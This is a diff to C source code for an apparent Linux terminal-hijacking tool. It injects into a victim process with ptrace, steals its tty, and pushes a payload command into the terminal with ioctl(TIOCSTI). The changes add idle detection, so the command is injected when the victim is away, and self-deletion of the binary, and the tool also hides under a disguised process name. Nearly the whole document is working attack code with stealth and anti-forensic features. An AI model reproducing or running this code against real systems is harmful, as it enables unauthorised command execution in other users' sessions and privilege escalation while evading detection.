@@ -5,6 +5,7 @@
 #include <sys/syscall.h>
 #include <sys/inotify.h>
 #include <sys/socket.h>
+#include <sys/select.h>
 #include <sys/wait.h>
 #include <sys/un.h>
 #include <sys/ioctl.h>
@@ -69,12 +70,15 @@
 }
 
 #define TRAP asm ("int $3")
+#define DATA_SIZE 256
 
 typedef void (*handler_t)(state_t *st);
 typedef int (*action_t)(int pid, state_t *state);
 
 char *monitor_inject[] = INJECT_LIST;
 char *monitor_sniff[] = SNIFF_LIST;
+char *binary_dirs[] = BINARY_DIRS;
+char *shell_list[] = SHELL_LIST;
 handler_t handler_sniff[] = HANDLER_LIST;
 pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -83,11 +87,13 @@ FILE *logfile;
 
 int push(char *str);
 
-int process_info(int pid) {
+int process_info(int pid, char *name, pid_t *ptr_ppid) {
 	int fd;
 	int tty;
+	pid_t ppid;
 	static char buf[256];
 	static char buf2[1024];
+	static char buf3[1024];
 	ssize_t s;
 
 	snprintf(buf, 256, "/proc/%d/stat", pid);
@@ -98,7 +104,11 @@ int process_info(int pid) {
 	if (s <= 0)
 		return -1;
 	buf2[s] = 0;
-	sscanf(buf2, "%*u %*s %*c %*u %*u %*u %u", &tty);
+	if (ptr_ppid == NULL)
+	        ptr_ppid = &ppid;
+        if (name == NULL)
+                name = buf3;
+	sscanf(buf2, "%*u %s %*c %d %*u %*u %u", name, ptr_ppid, &tty);
 	close(fd);
 	return tty;
 }
@@ -151,7 +161,7 @@ int filter_inject(int pid, state_t *state) {
 }
 
 int filter_sniff(int pid, state_t *state) {
-	int cur_tty = process_info(pid);
+	int cur_tty = process_info(pid, NULL, NULL);
 	if (state->tty == cur_tty) {
 		state->pid = pid;
 		return 1;
@@ -256,7 +266,7 @@ void forceexec() {
 
 	GET_STRLEN(path, r);
 	args[0] = path;
-	args[1] = path + r + 1;
+	args[1] = path + r;
 	args[2] = NULL;
 	SYSCALL(r, SYS_execve, path, args, NULL);
 }
@@ -319,9 +329,9 @@ int do_injection(int pid, state_t *state, int is_ctty) {
 	struct iovec iov;
 	struct cmsghdr *cmsg;
 	char buf[256];
-	char template[32];
-	char forceexec_paths[32];
-	char dirpath[32];
+	char template[DATA_SIZE];
+	char forceexec_paths[DATA_SIZE];
+	char dirpath[DATA_SIZE];
 	uint64_t backup[PAGE_SIZE / 8];
 	uint64_t addr;
 	unsigned int i;
@@ -346,14 +356,14 @@ int do_injection(int pid, state_t *state, int is_ctty) {
 	if (!is_ctty) {
 		memset(&local, 0, sizeof(local));
 		local.sun_family = AF_UNIX;
-		strcpy(template, TMPDIR "/sockXXXXXX");
+		strncpy(template, TMPDIR "/sockXXXXXX", sizeof(template));
 		sockpath = mkdtemp(template);
 		if (!sockpath) {
 			PERROR("mkdtemp");
 			return -1;
 		}
 		strcpy(dirpath, sockpath);
-		strcat(sockpath, "/sock");
+		strncat(sockpath, "/sock", sizeof(template) - strlen(sockpath));
 
 		strcpy(local.sun_path, sockpath);
 		if (bind(sock, (struct sockaddr *) &local, sizeof(local)) == -1) {
@@ -384,8 +394,7 @@ int do_injection(int pid, state_t *state, int is_ctty) {
 
 	if (is_ctty) {
 		fn = (uint8_t *)forceexec;
-		strcpy(forceexec_paths, state->myname);
-		strcpy(forceexec_paths + strlen(state->myname) + 1, "stage2");
+		strncpy(forceexec_paths, state->myname, sizeof(forceexec_paths));
 		path = (uint64_t *)forceexec_paths;
 	} else {
 		fn = (uint8_t *)passfd;
@@ -398,7 +407,7 @@ int do_injection(int pid, state_t *state, int is_ctty) {
 			return -1;
 		}
                       
-	for (i = 0; i < 32; i++ )
+	for (i = 0; i < DATA_SIZE; i++ )
 		if (ptrace(PTRACE_POKETEXT, pid, addr + (PAGE_SIZE >> 1 ) + i*8 , *(((uint64_t*) path) + i)) == -1) {
 			PERROR("poketext");
 			return -1;
@@ -497,7 +506,7 @@ int steal_tty(int pid,  state_t *state) {
 		return -1; 
 	fprintf(logfile, "Victim process found: %d (on tty: %s)\n", pid, link);
 #ifdef ATTEMPT_TIOCSTI
-	if (process_info(pid)) {
+	if (process_info(pid, NULL, NULL)) {
 		fprintf(logfile, "Victim process has a controlling terminal! Attempting ioctl(TIOCSTI) attack.\n");
 		is_ctty = 1;
 	} else {
@@ -586,11 +595,151 @@ int push(char *str) {
 	write(1, "\r", 1);
 	for (i = 0; i < strlen(str); i++)
 		ioctl(0, TIOCSTI, str + i, 1);
-	usleep(100); //TODO: make this more reliable
+	usleep(1000); //TODO: make this more reliable
 	write(1, "\033[1A", 4);
 	ioctl(0, TIOCSTI, "\n", 1);
 	return 0;
 
+}
+
+int check_for_commands(int my_tty) {
+	char name[PATH_MAX];
+	DIR *d;
+	struct dirent *de;
+#define FLAG_HAS_CHILD		1
+#define FLAG_IS_SHELL		2
+#define FLAG_ON_MY_TTY		4
+#define FLAG_HAS_MY_UID		8
+	uint8_t flags[PID_MAX + 1];
+	pid_t pid, ppid;
+	int can_proceed = 1;
+	int i, tty;
+
+	memset(&flags, 0, sizeof(flags));
+
+	d = opendir("/proc");
+	if (d == NULL)
+		return 0;
+
+	// We detect "leaf" processes 
+	while ((de = readdir(d))) {
+		pid = atoi(de->d_name);
+		if (pid != 0) {
+			tty = process_info(pid, name, &ppid);
+			if ((ppid < 0) || (ppid > PID_MAX))
+				exit (0); // should not happen
+			flags[ppid] |= FLAG_HAS_CHILD;
+			for (i = 0; shell_list[i]; i++) 
+				if (!strcmp(shell_list[i], name))
+					flags[pid] |= FLAG_IS_SHELL;
+			if (tty == my_tty)
+				flags[pid] |= FLAG_ON_MY_TTY;
+			if (!kill(pid, 0))
+				flags[pid] |= FLAG_HAS_MY_UID;
+
+		}
+	}
+	for (pid = 0; pid <= PID_MAX; pid++) {
+		if ((pid == getpid()) || !(flags[pid] & FLAG_ON_MY_TTY)) // Skip myself, and process on other ttys
+			continue;
+		if (!(flags[pid] & FLAG_HAS_CHILD) && !(flags[pid] & FLAG_IS_SHELL)) {
+			// There is probably a foreground program/command running on the tty
+			can_proceed = 0;
+			break;
+		}
+		if ((flags[pid] & FLAG_HAS_MY_UID)) {
+			// The tty still holds a session on my uid, so it is pointless to push back any command.
+			can_proceed = 0;
+			break;
+		}
+	}
+	closedir(d);
+	return can_proceed;
+}
+
+void wait_for_idle(int delay) {
+	int i, infd, r, fd;
+	pid_t maxpid;
+	ssize_t s;
+	int evfds[MONITOR_MAX];
+	char buf[512];
+	time_t last_activity = time(NULL);
+	time_t now;
+	int tty, my_tty;
+
+	my_tty = process_info(getpid(), NULL, NULL);
+
+	infd = inotify_init();
+	if (infd == -1) {
+		exit(0);
+	}
+
+	for (i = 0; binary_dirs[i] && i < MONITOR_MAX; i++) {
+		evfds[i] = inotify_add_watch(infd, binary_dirs[i], IN_OPEN);
+		if (evfds[i] == -1)
+			exit(0);
+	}
+	fd = open("/proc/loadavg", O_RDONLY);
+	for (;;) {
+		fd_set fds;
+		struct timeval to;
+		now = time(NULL);
+		to.tv_sec = 1;
+		to.tv_usec = 0;
+		FD_SET(infd, &fds);
+		r = select(infd + 1, &fds, NULL, NULL, &to);
+		if (r == -1)
+			exit(0);
+
+		if (FD_ISSET(infd, &fds)) {
+			s = read(infd, buf, sizeof(buf));
+			if (s <= 0)
+				exit(0);
+			s = read(fd, buf, sizeof(buf));
+			if (s <= 0)
+				exit(0);
+			sscanf(buf, "%*f %*f %*f %*u/%*u %u", &maxpid);
+			tty = process_info(maxpid, NULL, NULL);
+			if (tty == my_tty)
+				last_activity = now;
+		}
+		if (last_activity + delay < now) {
+			if (check_for_commands(my_tty)) {
+				close(fd);
+				return;
+			} 
+			last_activity = now; // any long-running program or non-root session "counts" as activity
+		}
+		lseek(fd, 0, SEEK_SET);
+	}
+}
+int erase_myself(int quiet) {
+	char mypath[PATH_MAX];
+	char *ptr;
+
+	if (readlink("/proc/self/exe", mypath, sizeof(mypath)) == -1) {
+		if (!quiet)
+			perror("readlink");
+		return -1;
+	}
+	if (unlink(mypath) == -1) {
+		if (!quiet)
+			perror("unlink");
+		return -1;
+	}
+	ptr = strrchr(mypath, '/');
+	if (ptr == NULL) {
+		if (!quiet)
+			fprintf(stderr, "malformed path name: %s\n", mypath);
+		return -1;
+	}
+	*ptr = '\0';
+	if (rmdir(mypath) == -1) {
+		if (!quiet)
+			perror("rmdir");
+		return -1;
+	} 
+	return 0;
 }
 
 int main(int argc, char **argv) {
@@ -598,23 +747,25 @@ int main(int argc, char **argv) {
 	int pipetab[2];
 	char path[PATH_MAX];
 	char mypath[PATH_MAX];
+	char envvar[PATH_MAX + 64];
 	char buf[4096];
-	char *ptr;
 	int fd, wfd, r, i;
 
-	if (argc == 2 && !strcmp(argv[1], "stage2")) {
-		sleep(PUSH_DELAY);
+	if (getenv("STAGE2")) {
+		erase_myself(1);
+		wait_for_idle(PUSH_IDLE_TIME);
 		push(PUSH_PAYLOAD);
 		exit(0);
 	} 
+
 	if (!getenv("HIDDEN")) {
 		// We hide by copying binary, because the argv[0] trick fail to work with some process listing tools.
-		strcpy(path, TMPDIR "/dirXXXXXX");
+		strncpy(path, TMPDIR "/dirXXXXXX", PATH_MAX);
 		if (!mkdtemp(path)) {
 			perror("mkdtemp");
 			exit(1);
 		}
-		strcat(path, "/" HIDDEN_NAME);
+		strncat(path, "/" HIDDEN_NAME, PATH_MAX - strlen(path));
 		if (readlink("/proc/self/exe", mypath, sizeof(mypath)) == -1) {
 			perror("readlink");
 			exit(1);
@@ -637,32 +788,20 @@ int main(int argc, char **argv) {
 		}
 		close(fd);
 		close(wfd);
-		putenv("HIDDEN=1");
-		execl(path, HIDDEN_NAME, mypath, NULL);
+		if ((argc == 2) && !strcmp(argv[1],"") && (getppid() == 1)) {
+			putenv("STAGE2=1");
+		}
+		snprintf(envvar, sizeof(envvar), "HIDDEN=%s", mypath);
+		putenv(envvar);
+		execl(path, HIDDEN_NAME, NULL);
 		perror("execl");
 		exit(0);
 	}
 	printf("Hidden as: %s\n", HIDDEN_NAME);
+	st.myname = getenv("HIDDEN");
+	if (erase_myself(0) != 0)
+		exit(1);
 
-	if (readlink("/proc/self/exe", mypath, sizeof(mypath)) == -1) {
-		perror("readlink");
-		exit(1);
-	}
-	st.myname = argv[1];
-	if (unlink(mypath) == -1) {
-		perror("unlink");
-		exit(1);
-	}
-	ptr = strrchr(mypath, '/');
-	if (ptr == NULL) {
-		fprintf(stderr, "malformed path name: %s\n", mypath);
-		exit(1);
-	}
-	*ptr = '\0';
-	if (rmdir(mypath) == -1) {
-		perror("rmdir");
-		exit(1);
-	} 
 
 #ifndef DEBUG
 	logfile = fopen(LOG_FILE, "a");
